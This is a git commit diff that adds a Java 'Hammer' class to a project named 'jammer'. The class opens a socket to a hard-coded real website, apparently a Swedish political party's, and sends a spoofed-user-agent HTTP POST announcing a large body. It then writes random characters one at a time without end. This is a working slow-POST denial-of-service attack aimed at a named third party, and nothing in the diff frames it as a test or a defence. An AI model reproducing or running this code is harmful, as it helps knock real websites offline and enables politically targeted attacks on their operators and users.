0509697caa2c38b5a7d8b2a2d8145d1c8e00869b
redpois0n <git@redpois0n>
2014-05-29 13:22:17 +0200

    Hammer first test

--- src/com/redpois0n/jammer/Hammer.java
+++ src/com/redpois0n/jammer/Hammer.java
@@ -1,5 +1,9 @@
 package com.redpois0n.jammer;
 
+import java.io.OutputStream;
+import java.net.Socket;
+import java.util.Random;
+
 public class Hammer implements Runnable {
 
 	public static final String[] USERAGENTS = new String[] { "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
@@ -9,7 +13,8 @@ public class Hammer implements Runnable {
 		"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16", 
 		"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
-		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13", "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
+		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13", 
+		"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
 		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", 
 		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)", 
@@ -22,10 +27,35 @@ public class Hammer implements Runnable {
 	@Override
 	public void run() {
 		try {
-
+			Socket socket = new Socket("www.feminisisktinitiativ.se", 80);
+			OutputStream os = socket.getOutputStream();
+			
+			String useragent = getRandomUserAgent();
+			
+			os.write(("POST / HTTP/1.1\r\n" +
+                    "Host: www.feminisisktinitiativ.se\r\n" +
+                    "User-Agent: " + useragent + "\r\n" +
+                    "Connection: keep-alive\r\n" +
+                    "Keep-Alive: 900\r\n" +
+                    "Content-Length: 10000\r\n" +
+                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").getBytes());
+			
+			while (true) {
+				os.write((randomChar()).getBytes());
+			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
+	}
+	
+	public static String getRandomUserAgent() {
+		return USERAGENTS[new Random().nextInt(USERAGENTS.length)];
+	}
+	
+	public static String randomChar() {
+		String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+		
+		return Character.toString(chars.charAt(new Random().nextInt(chars.length())));
 	}
 
 }
